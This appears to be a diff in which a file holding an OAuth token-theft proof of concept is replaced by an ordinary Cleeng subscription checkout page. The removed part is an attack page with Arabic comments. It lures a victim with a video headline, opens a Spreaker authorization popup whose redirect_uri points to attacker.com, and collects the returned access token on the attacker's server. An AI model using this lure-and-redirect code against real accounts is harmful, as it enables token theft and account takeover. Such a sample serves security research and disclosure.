@@ -1,35 +1,33 @@
-<!-- attacker.html — استضافة على attacker.com -->
-<html>
-<body>
-  <h1>شاهد هذا الفيديو الرائع!</h1>
-  <script>
-    // 1. نخلي الضحية يدخل على حساب Spreaker اللي بنتحكم فيه
-    var state = "attacker_state_123";
-    
-    // 2. نفتح OAuth popup بحساب المهاجم
-    var popup = window.open(
-      "https://www.spreaker.com/oauth2/authorize?" +
-      "client_id=KNOWN_CLIENT_ID&" +
-      "response_type=token&" +
-      "state=" + state + "&" +
-      "scope=basic&" +
-      "redirect_uri=https://attacker.com/callback",
-      "spreaker_login",
-      "width=500,height=500"
-    );
-    
-    // 3. نراقب لما الضحية يسجل دخوله — الـ token يروح لصفحتنا
-    function checkCallback() {
-      try {
-        if (popup.closed) {
-          // الضحية أُغلقت النافذة — token وصل لـ /callback بتاعتنا
-          alert("Done! Check server for token.");
-          return;
-        }
-      } catch(e) {}
-      setTimeout(checkCallback, 500);
-    }
-    setTimeout(checkCallback, 1000);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+  <title>Cleeng Checkout</title>
+
+  <script
+    type="module"
+    src="https://widgets.prod.cleeng.com/cleeng.js">
   </script>
+</head>
+
+<body style="background:#111;color:white;font-family:Arial;padding:40px;">
+
+  <h1>Subscribe Now</h1>
+
+  <div
+    data-cleeng-widget="checkout"
+    data-cleeng-publisher-id="419406894"
+    data-cleeng-offer-id="S116584984_EG"
+    data-cleeng-coupon-code="979125"
+    data-cleeng-language="en-US"
+    data-cleeng-props='{
+      "checkout": {
+        "mode": "standard"
+      }
+    }'>
+  </div>
+
 </body>
 </html>
